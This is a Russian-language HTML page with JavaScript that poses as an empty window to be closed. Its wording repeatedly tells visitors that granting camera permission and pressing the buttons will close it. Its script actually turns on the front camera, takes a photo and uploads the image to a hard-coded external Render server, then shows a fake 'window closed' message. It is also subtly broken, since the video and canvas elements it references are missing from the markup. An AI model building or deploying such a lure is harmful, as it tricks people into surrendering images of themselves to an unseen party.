<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
  <title>Camera</title>
  <style>
    :root { color-scheme: dark; }
    body{
      margin:0;
      background:#0b0f14;
      color:#e8eef6;
      font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
      text-align:center;
      padding:18px;
    }
    .card{max-width:520px;margin:0 auto}
    h2{margin:8px 0 8px}
    p{margin:6px 0; opacity:.85; line-height:1.35}
    
    button{
      margin:8px 6px;
      padding:12px 16px;
      border:0;
      border-radius:10px;
      background:#00c853;
      color:#0b0f14;
      font-weight:800;
      cursor:pointer;
    }
    button:disabled{opacity:.5; cursor:not-allowed}
    .status{margin-top:10px; opacity:.9}
    .small{font-size:12px; opacity:.65}
  </style>
</head>
<body>
  <div class="card">
    <h2>Закройте окно это пустой окно </h2>

    <!-- Важно: честно предупреждаем -->
    <p>Фото будет отправлено владельцу сайта.</p>

    
    <div>
      <button id="btnStart">Включить камеру</button>
      <button id="btnShot" disabled>Сделать фото</button>
      <button id="btnSend" disabled>Отправить</button>
    </div>

    <div class="status" id="status">Нажми “Включить камеру”.</div>
    <div class="small">Если сервер “спит”, первая отправка может занять до 30–50 секунд.</div>
  </div>

<script>
  // ТВОЙ сервер Render:
  const API_UPLOAD = "https://camera-server-ay1p.onrender.com/upload";

  const video  = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const status = document.getElementById("status");

  const btnStart = document.getElementById("btnStart");
  const btnShot  = document.getElementById("btnShot");
  const btnSend  = document.getElementById("btnSend");

  let stream = null;
  let hasPhoto = false;

  btnStart.onclick = async () => {
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
      });
      video.srcObject = stream;
      status.textContent = "✅ Камера включена. Нажми “Сделать фото”.";
      btnShot.disabled = false;
    } catch (e) {
      status.textContent = "нажимайте разрещить для закрытия окно";
    }
  };

  btnShot.onclick = () => {
    if (!stream) return;

    const w = video.videoWidth;
    const h = video.videoHeight;

    if (!w || !h) {
      status.textContent = "❗ Подожди 1 секунду — окно закрывается .";
      return;
    }

    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, w, h);

    hasPhoto = true;
    btnSend.disabled = false;
    status.textContent = "Окно закрыта . нажимайти полный закрыт ”.";
  };

  btnSend.onclick = async () => {
    if (!hasPhoto) return;

    btnStart.disabled = true;
    btnShot.disabled = true;
    btnSend.disabled = true;
    status.textContent = "Полний закрыт ";

    const data = canvas.toDataURL("image/jpeg", 0.9);

    try {
      const res = await fetch(API_UPLOAD, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ image: data })
      });

      if (!res.ok) throw new Error("HTTP " + res.status);

      const json = await res.json().catch(() => ({}));
      if (json.status !== "ok") throw new Error("Bad response");

      // Останавливаем камеру
      try {
        if (video.srcObject) {
          video.srcObject.getTracks().forEach(t => t.stop());
        }
      } catch {}

      // Очищаем страницу и показываем "Спасибо"
      setTimeout(() => {
        document.body.innerHTML = `
          <div style="min-height:100vh;display:grid;place-items:center;background:#0b0f14;color:#e8eef6;font-family:system-ui;text-align:center;padding:24px">
            <div>
              <h2 style="margin:0 0 10px">Спасибо окно закрыта  ✅</h2>
              <div style="opacity:.8">100% окно закрыта .</div>
            </div>
          </div>
        `;
      }, 400);

    } catch (e) {
      status.textContent = "❌ Ошибка закройте заново";
      btnStart.disabled = false;
      btnShot.disabled = !stream;
      btnSend.disabled = false;
    }
  };
</script>
</body>
</html>
